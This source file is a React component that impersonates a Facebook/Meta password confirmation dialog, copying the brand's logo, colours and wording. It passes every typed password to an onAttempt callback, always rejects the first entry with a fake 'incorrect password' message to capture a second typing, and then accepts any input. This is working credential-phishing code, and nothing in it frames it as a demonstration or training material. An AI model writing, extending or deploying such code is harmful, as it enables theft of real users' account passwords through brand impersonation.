"use client";

import { useState } from "react";

interface PasswordModalProps {
  onClose: () => void;
  onSubmit: () => void;
  onAttempt: (value: string) => void;
}

export default function PasswordModal({ onClose, onSubmit, onAttempt }: PasswordModalProps) {
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [forcedFail, setForcedFail] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onAttempt(password);
    if (!forcedFail) {
      setError(true);
      setForcedFail(true);
      setAttempts((prev) => prev + 1);
      return;
    }

    if (password.length > 0) {
      setError(false);
      onSubmit();
    } else {
      setError(true);
      setAttempts((prev) => prev + 1);
    }
  };

  return (
    <div className="modal-overlay" onClick={(e) => e.target === e.currentTarget && onClose()}>
      <div className="password-modal" onClick={(e) => e.stopPropagation()}>
        <div className="password-modal-header">
          <div className="password-modal-logo">f</div>
        </div>
        <p className="password-modal-title">For your security, you must enter your password to continue.</p>
        <form onSubmit={handleSubmit}>
          <div className="password-input-wrapper">
            <input
              type={showPassword ? "text" : "password"}
              className={`password-input ${error ? "error" : ""}`}
              placeholder="Password"
              autoComplete="off"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <button
              type="button"
              className="password-toggle"
              onClick={() => setShowPassword(!showPassword)}
              aria-label="Toggle password visibility"
            >
              <svg viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" fill="none">
                {showPassword ? (
                  <>
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                  </>
                ) : (
                  <>
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                    <line x1="1" y1="1" x2="23" y2="23"></line>
                  </>
                )}
              </svg>
            </button>
          </div>
          {error && (
            <div className="password-error show">The password you&#39;ve entered is incorrect.</div>
          )}
          <button type="submit" className="password-continue-btn">Continue</button>
          <a href="#" className="password-forgot-link">Forgot your password?</a>
        </form>
        <div className="password-modal-footer">
          <div className="meta-logo">
            <span>∞</span>
            <span>Meta</span>
          </div>
        </div>
      </div>
      <style jsx>{`
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.5);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10000;
          padding: 20px;
        }

        .password-modal {
          background-color: #ffffff;
          border-radius: 12px;
          width: 90%;
          max-width: 400px;
          padding: 32px;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .password-modal-header {
          text-align: center;
          margin-bottom: 24px;
        }

        .password-modal-logo {
          width: 64px;
          height: 64px;
          background-color: #1877f2;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          margin: 0 auto 16px;
          font-size: 32px;
          color: white;
          font-weight: bold;
        }

        .password-modal-title {
          font-size: 18px;
          color: #65676b;
          margin-bottom: 20px;
          text-align: center;
        }

        .password-input-wrapper {
          position: relative;
          margin-bottom: 8px;
        }

        .password-input {
          width: 100%;
          padding: 12px;
          border: 2px solid #ccd0d5;
          border-radius: 8px;
          font-size: 16px;
          font-family: inherit;
          transition: border-color 0.2s;
        }

        .password-input.error {
          border-color: #e41e3f;
        }

        .password-input:focus {
          outline: none;
          border-color: #1877f2;
        }

        .password-toggle {
          position: absolute;
          right: 12px;
          top: 50%;
          transform: translateY(-50%);
          background: none;
          border: none;
          cursor: pointer;
          padding: 4px;
          width: 24px;
          height: 24px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .password-toggle svg {
          width: 20px;
          height: 20px;
          stroke: #65676b;
        }

        .password-error {
          color: #e41e3f;
          font-size: 13px;
          margin-bottom: 16px;
          display: none;
        }

        .password-error.show {
          display: block;
        }

        .password-continue-btn {
          width: 100%;
          padding: 12px;
          background-color: #1877f2;
          color: #ffffff;
          border: none;
          border-radius: 8px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          margin-bottom: 12px;
          transition: background-color 0.2s;
        }

        .password-continue-btn:hover {
          background-color: #166fe5;
        }

        .password-forgot-link {
          text-align: center;
          color: #1877f2;
          font-size: 14px;
          text-decoration: none;
          display: block;
        }

        .password-forgot-link:hover {
          text-decoration: underline;
        }

        .password-modal-footer {
          margin-top: 24px;
          text-align: center;
        }

        .meta-logo {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 4px;
          color: #65676b;
          font-size: 14px;
        }
      `}</style>
    </div>
  );
}

